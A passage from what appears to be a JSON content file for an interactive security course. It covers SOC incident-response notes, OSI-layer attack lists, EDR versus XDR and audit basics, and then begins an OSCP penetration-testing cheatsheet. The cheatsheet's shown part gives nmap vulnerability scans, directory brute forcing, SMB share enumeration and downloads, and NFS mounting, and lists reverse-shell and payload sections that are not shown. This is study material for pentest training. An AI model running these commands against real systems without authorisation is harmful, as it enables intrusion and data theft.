                  "text": "Indicators:",
                  "subItems": [
                    "Anti-Virus alerts",
                    "Connection to suspicious IPs."
                  ]
                },
                {
                  "text": "Investigate:",
                  "subItems": [
                    "AV logs, OS logs, Account logs, Network traffic."
                  ]
                },
                {
                  "text": "Actions:",
                  "subItems": [
                    "Request AV checks",
                    "Isolate the machine."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "4. Data Exfiltration"
            },
            {
              "type": "ul",
              "items": [
                {
                  "text": "Details:",
                  "subItems": [
                    "Attacker or rogue employee exfiltrates data to external sources."
                  ]
                },
                {
                  "text": "Indicators:",
                  "subItems": [
                    "Abnormal high network traffic",
                    "Connection to cloud-storage solutions."
                  ]
                },
                {
                  "text": "Investigate:",
                  "subItems": [
                    "Network traffic, Proxy logs, OS logs."
                  ]
                },
                {
                  "text": "Actions:",
                  "subItems": [
                    "If employee: Contact manager, perform forensics. If external: Isolate the machine."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "5. Advanced Persistent Threats (APTs)"
            },
            {
              "type": "ul",
              "items": [
                {
                  "text": "Details:",
                  "subItems": [
                    "Attackers gain access and create backdoors for further exploitation. Usually hard to detect."
                  ]
                },
                {
                  "text": "Indicators:",
                  "subItems": [
                    "Suspicious IP connections",
                    "Abnormal network traffic",
                    "Off-hour’s access logs",
                    "New admin accounts."
                  ]
                },
                {
                  "text": "Investigate:",
                  "subItems": [
                    "Network traffic, Access logs, OS logs (new processes, connections, users)."
                  ]
                },
                {
                  "text": "Actions:",
                  "subItems": [
                    "Isolate the machine and start formal forensics process."
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "osi-attacks",
          "title": "OSI Layer Attacks",
          "content": [
            {
              "type": "h2",
              "text": "OSI Layer Attacks"
            },
            {
              "type": "ul",
              "items": [
                {
                  "text": "(2) Data Link Layer",
                  "subItems": [
                    "ARP Spoofing/Poisoning",
                    "MAC Flooding"
                  ]
                },
                {
                  "text": "(3) Network Layer",
                  "subItems": [
                    "IP Spoofing",
                    "Smurf Attack",
                    "ICMP Flooding",
                    "DHCP Spoofing"
                  ]
                },
                {
                  "text": "(4) Transport Layer",
                  "subItems": [
                    "TCP SYN Flood",
                    "TCP Session Hijacking",
                    "TCP Reset attack",
                    "UDP Flooding"
                  ]
                },
                {
                  "text": "(5) Session Layer",
                  "subItems": [
                    "Session Hijacking"
                  ]
                },
                {
                  "text": "(6) Presentation Layer",
                  "subItems": [
                    "SSL/TLS Striping"
                  ]
                },
                {
                  "text": "(7) Application Layer",
                  "subItems": [
                    "DNS Attacks",
                    "HTTP/HTTPS (Web Attacks)",
                    "FTP Attacks",
                    "TELNET Attacks"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "detection-categories",
          "title": "Detection Categories",
          "content": [
            {
              "type": "h2",
              "text": "Detection Categories"
            },
            {
              "type": "colored_p",
              "parts": [
                "1. A ",
                {
                  "text": "true positive",
                  "color": "green"
                },
                " is an ",
                {
                  "text": "alert",
                  "color": "green"
                },
                " that correctly detects the presence of an attack."
              ]
            },
            {
              "type": "colored_p",
              "parts": [
                "2. A ",
                {
                  "text": "true negative",
                  "color": "fuchsia"
                },
                " is when no malicious activity exists, and ",
                {
                  "text": "no alert",
                  "color": "fuchsia"
                },
                " is triggered."
              ]
            },
            {
              "type": "colored_p",
              "parts": [
                "3. A ",
                {
                  "text": "false positive",
                  "color": "yellow"
                },
                " is an alert that incorrectly detects a threat. This is when an IDS identifies an activity as malicious, but it isn't."
              ]
            },
            {
              "type": "colored_p",
              "parts": [
                "4. A ",
                {
                  "text": "false negative",
                  "color": "red"
                },
                " is a state where a threat is not detected. This is when malicious activity happens but an IDS fails to detect it. False negatives are dangerous."
              ]
            },
            {
              "type": "table",
              "rows": [
                [
                  {
                    "text": "Positive",
                    "color": "green"
                  },
                  {
                    "text": "There is an Alert"
                  }
                ],
                [
                  {
                    "text": "Negative",
                    "color": "fuchsia"
                  },
                  {
                    "text": "There is no Alert"
                  }
                ]
              ]
            }
          ]
        },
        {
          "id": "edr-vs-xdr",
          "title": "EDR vs XDR",
          "content": [
            {
              "type": "h2",
              "text": "EDR (Endpoint Detection and Response)"
            },
            {
              "type": "ul",
              "items": [
                {
                  "text": "Focus:",
                  "subItems": [
                    {
                      "parts": [
                        "Monitors and responds to threats at the ",
                        {
                          "text": "endpoint level",
                          "color": "blue"
                        },
                        " (computers, servers)."
                      ]
                    }
                  ]
                },
                {
                  "text": "Capabilities:",
                  "subItems": [
                    "Endpoint Visibility",
                    "Threat Detection",
                    "Incident Response",
                    "Forensic Analysis",
                    "Endpoint Isolation"
                  ]
                }
              ]
            },
            {
              "type": "h2",
              "text": "XDR (Extended Detection and Response)"
            },
            {
              "type": "ul",
              "items": [
                {
                  "text": "Scope:",
                  "subItems": [
                    {
                      "parts": [
                        "Expands ",
                        {
                          "text": "beyond endpoints",
                          "color": "purple"
                        },
                        " to integrate and correlate data from multiple security layers (endpoints, networks, email, cloud)."
                      ]
                    }
                  ]
                },
                {
                  "text": "Capabilities:",
                  "subItems": [
                    "Unified Visibility",
                    "Automated Response",
                    "Advanced Analytics"
                  ]
                }
              ]
            },
            {
              "type": "highlight",
              "color": "blue",
              "text": "Summary: EDR is focused on endpoints. XDR provides a more comprehensive, cross-layer view of threats by integrating data from many different security sources."
            }
          ]
        },
        {
          "id": "attack-scenarios",
          "title": "Attack Scenarios",
          "content": [
            {
              "type": "h2",
              "text": "Scenario 1: Ransomware Attack"
            },
            {
              "type": "h3",
              "text": "Detection"
            },
            {
              "type": "ol",
              "items": [
                "Notice Early Signs: Ransom message, inaccessible files, slow performance.",
                "Isolate the Device: Disconnect from the network immediately.",
                "Use Security Software: Run an antivirus/anti-malware scan.",
                "Check Logs and Suspicious Activities."
              ]
            },
            {
              "type": "h3",
              "text": "Mitigation"
            },
            {
              "type": "ol",
              "items": [
                "Isolate Suspicious Files.",
                "Restore from Backup.",
                "Clean the Device."
              ]
            },
            {
              "type": "highlight",
              "color": "green",
              "text": "Log Sources: Firewall Logs, Network logs, and Antivirus/Anti-malware Logs."
            },
            {
              "type": "h2",
              "text": "Scenario 2: Phishing Attack"
            },
            {
              "type": "p",
              "text": "An employee receives a deceptive email prompting them to click a link or download an attachment."
            },
            {
              "type": "h3",
              "text": "Response"
            },
            {
              "type": "ol",
              "items": [
                "Identify the Phishing Email.",
                "Contain and Report: Report to IT, delete the email, block the sender.",
                "Scan for Malware if an attachment was downloaded.",
                "Educate users with regular training."
              ]
            },
            {
              "type": "highlight",
              "color": "green",
              "text": "Logs to Check: Email Server Logs, Firewall Logs, Endpoint Security Logs."
            },
            {
              "type": "h2",
              "text": "Scenario 3: Data Breach"
            },
            {
              "type": "p",
              "text": "Sensitive information is accessed or stolen by an unauthorized party."
            },
            {
              "type": "h3",
              "text": "Response"
            },
            {
              "type": "ol",
              "items": [
                "Contain the Breach: Disconnect affected systems from the network.",
                "Identify and Close Vulnerabilities: Investigate and patch.",
                "Notify Affected Parties.",
                "Improve Security."
              ]
            },
            {
              "type": "highlight",
              "color": "green",
              "text": "Logs to Check: Access Logs, System Event Logs, Network Logs."
            }
          ]
        }
      ]
    },
    "audit": {
      "title": "Auditing Interactive Guide",
      "topics": [
        {
          "id": "audit-introduction",
          "title": "Intro to Auditing",
          "content": [
            {
              "type": "h2",
              "text": "What is a Cybersecurity Audit?"
            },
            {
              "type": "colored_p",
              "parts": [
                "A cybersecurity audit is a ",
                {
                  "text": "comprehensive review",
                  "color": "green"
                },
                " and analysis of an organization's IT infrastructure, policies, and operations. The goal is to identify threats and vulnerabilities, ensure compliance with regulations, and recommend security improvements."
              ]
            },
            {
              "type": "highlight",
              "color": "blue",
              "text": "Audits are different from vulnerability assessments; they are more formal and focus on compliance and policies."
            }
          ]
        },
        {
          "id": "audit-process",
          "title": "The Audit Process",
          "content": [
            {
              "type": "h2",
              "text": "Key Phases of a Cybersecurity Audit"
            },
            {
              "type": "ol",
              "items": [
                "Planning and Scoping",
                "Information Gathering & Review",
                "Vulnerability Scanning & Penetration Testing",
                "Analysis and Reporting",
                "Remediation and Follow-up"
              ]
            },
            {
              "type": "img",
              "alt": "massive",
              "src": "https://raw.githubusercontent.com/xcode96/adm1/main/img/1.jpg"
            }
          ]
        }
      ]
    },
    "react-basics-lab": {
      "title": "OSCP Interactive Guide",
      "topics": [
        {
          "id": "toc",
          "title": "Welcome to OSCP",
          "content": [
            {
              "type": "h1",
              "text": "OSCP Cheatsheet"
            },
            {
              "type": "p",
              "parts": [
                "The following collection is a wild (but structured) selection of commands, snippets, links, exploits, tools, lists and techniques I personally tested and used on my journey to becoming an OSCP. I will extend, restructure and update it from time to time, so let's see where this is going."
              ]
            },
            {
              "type": "p",
              "parts": [
                "**THIS IS WORK IN PROGRESS**"
              ]
            },
            {
              "type": "h2",
              "text": "Disclaimer"
            },
            {
              "type": "p",
              "parts": [
                "This cheatsheet is definitely not \"complete\". I am sure i forgot to write down hundreds of essential commands, used most of them in the wrong way with unnessecary flags and you'll  probably soon ask yourself how i've even made it through the exam. Also you might think a certain tool used should be in another phase of the attack (e.g certain nmap vulnerabitly scripts should be in Exploitation). That's okay, imho the edges between different stages of a penetration test are very blurry. Feel free to issue a PR if you want to help to improve the list.\n*There are a number of tools you are not allowed to use during your OSCP exam. At the time of writing, sqlmap is one of them. Check which tools are restricted/banned before you use them in your exam. You can find detailed information about tool usage in the exam guidelines.*\n**Use for educational purposes only!**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h1",
              "text": "Table Of Content"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "OSCP Cheatsheet",
                      "href": "#oscp-cheatsheet"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Disclaimer",
                      "href": "#disclaimer"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Reconnaissance",
                      "href": "#reconnaissance"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Autorecon",
                      "href": "#autorecon"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Nmap",
                      "href": "#nmap"
                    }
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "+ ",
                {
                  "type": "link",
                  "text": "Initial Fast TCP Scan",
                  "href": "#initial-fast-tcp-scan"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Full TCP Scan",
                  "href": "#full-tcp-scan"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Limited Full TCP Scan",
                  "href": "#limited-full-tcp-scan"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Top 100 UDP Scan",
                  "href": "#top-100-udp-scan"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Full Vulnerability scan",
                  "href": "#full-vulnerability-scan"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Vulners Vulnerability Script",
                  "href": "#vulners-vulnerability-script"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "SMB Vulnerabitlity Scan",
                  "href": "#smb-vulnerabitlity-scan"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "Gobuster",
                  "href": "#gobuster"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "HTTP",
                  "href": "#http"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Fast Scan (Small List)",
                  "href": "#fast-scan--small-list-"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Fast Scan (Big List)",
                  "href": "#fast-scan--big-list-"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Slow Scan (Check File Extensions)",
                  "href": "#slow-scan--check-file-extensions-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "HTTPS",
                  "href": "#https"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "SMBCLIENT",
                  "href": "#smbclient"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "List Shares (As Guest)",
                  "href": "#list-shares--as-guest-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Connect to A Share (As User John)",
                  "href": "#connect-to-a-share--as-user-john-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Download All Files From A Directory Recursively",
                  "href": "#download-all-files-from-a-directory-recursively"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Alternate File Streams",
                  "href": "#alternate-file-streams"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "List Streams",
                  "href": "#list-streams"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Download Stream By Name (:SECRET)",
                  "href": "#download-stream-by-name---secret-"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "Enum4Linux",
                  "href": "#enum4linux"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Scan Host",
                  "href": "#scan-host"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Scan Host, Suppress Errors",
                  "href": "#scan-host--suppress-errors"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "NFS",
                  "href": "#nfs"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Show mountable drives",
                  "href": "#show-mountable-drives"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Mount Drive",
                  "href": "#mount-drive"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "WebApp Paths",
                  "href": "#webapp-paths"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "SQLMAP",
                  "href": "#sqlmap"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Get Request",
                  "href": "#get-request"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Test All (Default Settings)",
                  "href": "#test-all--default-settings-"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Test All (Default Settings, High Stress)",
                  "href": "#test-all--default-settings--high-stress-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Post Request (Capture with BURP)",
                  "href": "#post-request--capture-with-burp-"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Test All (Default Settings)",
                  "href": "#test-all--default-settings--1"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Test All (Default Settings, High Stress)",
                  "href": "#test-all--default-settings--high-stress--1"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Get A Reverse Shell (MySQL)",
                  "href": "#get-a-reverse-shell--mysql-"
                }
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Brute Force",
                      "href": "#brute-force"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Hydra",
                      "href": "#hydra"
                    }
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "+ ",
                {
                  "type": "link",
                  "text": "HTTP Basic Authentication",
                  "href": "#http-basic-authentication"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "HTTP Get Request",
                  "href": "#http-get-request"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "HTTP Post Request",
                  "href": "#http-post-request"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "MYSQL",
                  "href": "#mysql"
                }
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "File Transfer",
                      "href": "#file-transfer"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Powershell",
                      "href": "#powershell"
                    }
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "+ ",
                {
                  "type": "link",
                  "text": "As Cmd.exe Command",
                  "href": "#as-cmdexe-command"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Encode Command for Transfer",
                  "href": "#encode-command-for-transfer"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "Certutil",
                  "href": "#certutil"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Download",
                  "href": "#download"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Download & Execute Python Command",
                  "href": "#download---execute-python-command"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "SMB",
                  "href": "#smb"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Start Impacket SMB Server (With SMB2 Support)",
                  "href": "#start-impacket-smb-server--with-smb2-support-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "List Drives (Execute on Victim)",
                  "href": "#list-drives--execute-on-victim-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Copy Files (Execute on Victim)",
                  "href": "#copy-files--execute-on-victim-"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "PureFTP",
                  "href": "#pureftp"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Install",
                  "href": "#install"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Create setupftp.sh Execute The Script",
                  "href": "#create-setupftpsh-execute-the-script"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Get Service Ready",
                  "href": "#get-service-ready"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Reset Password",
                  "href": "#reset-password"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Commit Changes",
                  "href": "#commit-changes"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Restart Service",
                  "href": "#restart-service"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Create FTP Script (On Victim)",
                  "href": "#create-ftp-script--on-victim-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Exectue Script (on Victim)",
                  "href": "#exectue-script--on-victim-"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "Netcat",
                  "href": "#netcat"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "Receiving Shell",
                  "href": "#receiving-shell"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "Sending Shell",
                  "href": "#sending-shell"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "TFTP",
                  "href": "#tftp"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Start TFTP Daemon (Folder /var/tftp)",
                  "href": "#start-tftp-daemon--folder--var-tftp-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Transfer Files",
                  "href": "#transfer-files"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "VBScript",
                  "href": "#vbscript"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Create wget.vbs File",
                  "href": "#create-wgetvbs-file"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Download Files",
                  "href": "#download-files"
                }
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Shells",
                      "href": "#shells"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Upgrade Your Shell (TTY Shell)",
                      "href": "#upgrade-your-shell--tty-shell-"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Enable Tab-Completion",
                      "href": "#enable-tab-completion"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Catching Reverse Shells (Netcat)",
                      "href": "#catching-reverse-shells--netcat-"
                    }
                  ]
                },
                {
                  "parts": [
                    {
                      "type": "link",
                      "text": "Netcat",
                      "href": "#netcat-1"
                    }
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "+ ",
                {
                  "type": "link",
                  "text": "Reverse Shell",
                  "href": "#reverse-shell"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Unix",
                  "href": "#unix"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Windows",
                  "href": "#windows"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Bind shell",
                  "href": "#bind-shell"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Unix",
                  "href": "#unix-1"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "Windows",
                  "href": "#windows-1"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "Bash",
                  "href": "#bash"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Reverse Shell",
                  "href": "#reverse-shell-1"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "Python",
                  "href": "#python"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "As Command (Reverse Shell)",
                  "href": "#as-command--reverse-shell-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Python Code (Reverse Shell)",
                  "href": "#python-code--reverse-shell-"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "PHP",
                  "href": "#php"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Kali Default PHP Reverse Shell",
                  "href": "#kali-default-php-reverse-shell"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Kali Default PHP CMD Shell",
                  "href": "#kali-default-php-cmd-shell"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "PHP Reverse Shell",
                  "href": "#php-reverse-shell"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "CMD Shell",
                  "href": "#cmd-shell"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "WhiteWinterWolf Webshell",
                  "href": "#whitewinterwolf-webshell"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "MSFVENOM",
                  "href": "#msfvenom"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Windows Binary (.exe)",
                  "href": "#windows-binary--exe-"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "32 Bit (x86)",
                  "href": "#32-bit--x86-"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "64 Bit (x64)",
                  "href": "#64-bit--x64-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Linux Binary (.elf)",
                  "href": "#linux-binary--elf-"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "32 Bit (x86)",
                  "href": "#32-bit--x86--1"
                },
                "\n      - ",
                {
                  "type": "link",
                  "text": "64 Bit (x64)",
                  "href": "#64-bit--x64--1"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Java Server Pages (.jsp)",
                  "href": "#java-server-pages--jsp-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Active Sever Pages Extended (.aspx)",
                  "href": "#active-sever-pages-extended--aspx-"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "Active Sever Pages Extended (.aspx)",
                  "href": "#active-sever-pages-extended--aspx--1"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Transfer A File (Certutil)",
                  "href": "#transfer-a-file--certutil-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Execute a File",
                  "href": "#execute-a-file"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "Jenkins / Groovy (Java)",
                  "href": "#jenkins---groovy--java-"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Linux Reverse Shell",
                  "href": "#linux-reverse-shell"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Windows Reverse Shell",
                  "href": "#windows-reverse-shell"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "Perl",
                  "href": "#perl"
                },
                "\n    + ",
                {
                  "type": "link",
                  "text": "Reverse Shell",
                  "href": "#reverse-shell-2"
                },
                "\n  * ",
                {
                  "type": "link",
                  "text": "PhpmyAdmin",
                  "href": "#phpmyadmin"
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h1",
              "text": "Reconnaissance"
            },
            {
              "type": "h2",
              "text": "Autorecon"
            },
            {
              "type": "p",
              "parts": [
                "https://github.com/Tib3rius/AutoRecon"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "autorecon -vv 192.168.0.1"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Nmap"
            },
            {
              "type": "h3",
              "text": "Initial Fast TCP Scan"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nmap -v -sS -sV -Pn --top-ports 1000 -oA initial_scan_192.168.0.1 192.168.0.1"
            },
            {
              "type": "h3",
              "text": "Full TCP Scan"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nmap -v -sS -Pn -sV -p 0-65535 -oA full_scan_192.168.0.1 192.168.0.1"
            },
            {
              "type": "h3",
              "text": "Limited Full TCP Scan"
            },
            {
              "type": "p",
              "parts": [
                "*If the syn scan is taking very long to complete, the following command is an alternative (no service detection).*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nmap -sT -p- --min-rate 5000 --max-retries 1 192.168.0.1"
            },
            {
              "type": "h3",
              "text": "Top 100 UDP Scan"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nmap -v -sU -T4 -Pn --top-ports 100 -oA top_100_UDP_192.168.0.1 192.168.0.1"
            },
            {
              "type": "h3",
              "text": "Full Vulnerability scan"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nmap -v -sS  -Pn --script vuln --script-args=unsafe=1 -oA full_vuln_scan_192.168.0.1 192.168.0.1"
            },
            {
              "type": "h3",
              "text": "Vulners Vulnerability Script"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nmap -v -sS  -Pn --script nmap-vulners -oA full_vuln_scan_192.168.0.1 192.168.0.1"
            },
            {
              "type": "h3",
              "text": "SMB Vulnerabitlity Scan"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vuln_scan_192.168.0.1 192.168.0.1"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Gobuster"
            },
            {
              "type": "h3",
              "text": "HTTP"
            },
            {
              "type": "h4",
              "text": "Fast Scan (Small List)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirb/big.txt -t 20"
            },
            {
              "type": "h4",
              "text": "Fast Scan (Big List)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20"
            },
            {
              "type": "h4",
              "text": "Slow Scan (Check File Extensions)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20"
            },
            {
              "type": "h3",
              "text": "HTTPS"
            },
            {
              "type": "p",
              "parts": [
                "*Set the `--insecuressl` flag.*"
              ]
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "SMBCLIENT"
            },
            {
              "type": "p",
              "parts": [
                "To fix `NT_STATUS_CONNECTION_DISCONNECTED` errors in new Kali installations add `client min protocol = NT1` to your `\\etc\\samba\\smb.conf` file."
              ]
            },
            {
              "type": "h3",
              "text": "List Shares (As Guest)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "smbclient -U guest -L 192.168.0.1"
            },
            {
              "type": "h3",
              "text": "Connect to A Share (As User John)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "smbclient \\\\\\\\192.168.0.1\\\\Users -U c.smith"
            },
            {
              "type": "h3",
              "text": "Download All Files From A Directory Recursively"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "smbclient '\\\\server\\share' -N -c 'prompt OFF;recurse ON;cd 'path\\to\\directory\\';lcd '~/path/to/download/to/';mget *'\n\nexample:\nsmbclient \\\\\\\\192.168.0.1\\\\Data -U John -c 'prompt OFF;recurse ON;cd '\\Users\\John\\';lcd '/tmp/John';mget *'"
            },
            {
              "type": "h3",
              "text": "Alternate File Streams"
            },
            {
              "type": "h4",
              "text": "List Streams"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "smbclient \\\\\\\\192.168.0.1\\\\Data -U John -c 'allinfo \"\\Users\\John\\file.txt\"'"
            },
            {
              "type": "h4",
              "text": "Download Stream By Name (:SECRET)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "smbclient \\\\\\\\192.168.0.1\\\\Data -U John\n\nget \"\\Users\\John\\file.txt:SECRET:$DATA\""
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Enum4Linux"
            },
            {
              "type": "h3",
              "text": "Scan Host"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "enum4linux 192.168.0.1"
            },
            {
              "type": "h3",
              "text": "Scan Host, Suppress Errors"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "enum4linux 192.168.0.1 | grep -Ev '^(Use of)' > enum4linux.out "
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "NFS"
            },
            {
              "type": "h3",
              "text": "Show mountable drives"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "showmount -e 192.168.0.1"
            },
            {
              "type": "h3",
              "text": "Mount Drive"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "mkdir mpt\nmount -t nfs -o soft 192.168.0.1:/backup mpt/"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "WebApp Paths"
            },
            {
              "type": "p",
              "parts": [
                "https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md"
              ]
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "SQLMAP"
            },
            {
              "type": "p",
              "parts": [
                "**DISCLAIMER: There are a number of tools you are not allowed to use in your OSCP exam. At the time of writing, sqlmap is one of them. Check which tools are restricted/banned before you use them during your exam. You can find detailed information about tool usage in the exam guidelines.**"
              ]
            },
            {
              "type": "h3",
              "text": "Get Request"
            },
